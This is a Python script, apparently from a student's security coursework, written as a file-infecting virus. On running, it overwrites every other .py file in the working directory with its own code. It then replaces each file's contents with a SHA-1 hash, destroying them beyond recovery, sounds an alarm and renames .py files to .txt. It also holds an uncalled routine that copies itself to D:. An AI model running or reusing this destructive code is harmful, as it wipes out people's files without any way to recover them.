import os
# import sys
import hashlib
import time
import winsound

v = open(__file__, 'r', encoding='utf-8')  # 以只读方式打开当前目录下的当前文件

def tname():  # 把目标目录下的py文件改为txt文件
    os.chdir(r'F:\learn\experiment\python\xxaq')
    # 列出当前目录下所有的文件
    files = os.listdir('./')
    print('files', files)

    for fileName in files:
        portion = os.path.splitext(fileName)
        # 如果后缀是.py
        if portion[1] == ".py":
            # 把原文件后缀名改为 txt
            if portion[0] != 'pythontik1':
                newName = portion[0] + ".txt"
                os.rename(fileName, newName)
            else:
                continue


def voice():  # 警报响起
    print('警报')
    time.sleep(1)
    winsound.Beep(1000, 10000)


def jiami(text,txt,vi):
    if (text != "pythontik1.py"):
        v.close()
        txt.close()
        vi.close()

        xd = open(text, 'rb').read()  # 以二进制文件打开
        gys = xd
        sha1 = hashlib.sha1(gys)  # 加密
        osv = sha1.hexdigest()
        print(osv)
        bx = bytes(osv, encoding='utf-8')
        with open(text, 'wb') as f:
            f.write(bx)
        # tname()
        # voice()

def yc():#将文件代码复制一份，保存在D盘
    os.chdir(r'F:\learn\experiment\python\xxaq')

    gointo = open('D:/pythontik1.py', 'w', encoding='utf-8')  # 以写的方式打开当前目录下指定的文件,该文件不存在则创建之
    # 下面将当前文件的内容写入指定文件中
    for code in v.readlines():
        gointo.write(code)


def main():
    i = 0
    files = os.listdir('./')
    for fileName in files:
        portion = os.path.splitext(fileName)
        # print(portion[0])
        text = portion[0] + '.py'
        # print(text)
        # 如果后缀是.py
        if portion[1] == ".py":
            if portion[0]=="pythontik1":
                continue
            else:
                i = i + 1
                txt = open(text, 'w', encoding='utf-8')
                vi = open(__file__, 'r', encoding='utf-8')  # 以只读方式打开当前目录下的当前文件
                print('感染第{0}个文件'.format(i))

            for code in vi.readlines():
                txt.write(code)
            voice()
            jiami(text,txt,vi)
            tname()
main()
